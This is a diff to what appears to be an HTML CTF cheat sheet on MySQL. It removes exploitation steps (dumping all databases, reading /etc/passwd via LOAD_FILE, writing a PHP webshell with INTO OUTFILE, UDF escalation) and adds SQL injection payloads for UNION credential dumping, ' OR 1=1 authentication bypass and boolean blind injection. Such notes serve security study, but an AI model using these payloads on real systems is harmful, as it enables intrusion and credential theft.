@@ -145,27 +145,14 @@
     </details>
 
     <details>
-      <summary>3) Exploitation Phase</summary>
+      <summary>SQL Injection</summary>
       <pre>
-- Dumping data (authenticated):
-    mysqldump -h &lt;target&gt; -u user -p'password' --all-databases > dump.sql
-
-- Read server files via SQL functions (if FILE privilege or insecure secure_file_priv):
-    SELECT LOAD_FILE('/etc/passwd');
-    SELECT @@global.secure_file_priv;
-
-- Write files (if FILE/write allowed) to webroot to get a webshell:
-    SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
-
-- UDF / shared object based privilege escalation (advanced, only in CTF/lab):
-    # create shared object on server and register UDF to execute commands
-
-- Use credentials found to pivot: SSH, HTTP (admin panels), or other DB servers
-- If remote root access allowed, change passwords or create admin user (ONLY in authorized CTFs)
-- When service is reachable only from app server, use SQLi (sqlmap) or stolen DB creds to access remote DB
+        In-Band SQL Ex:     0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+        Blind SQL- Authentication Bypass Ex:    ' OR 1=1;--
+        Blind SQL- Boolean Based Ex:   admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+        
       </pre>
       <p>
-        Exploitation depends on privileges. FILE or OUTFILE capabilities let you interact with the filesystem; UDFs can give command execution. Always follow rules of engagement in competitions—UDFs and OUTFILE are destructive if misused.
       </p>
     </details>
 
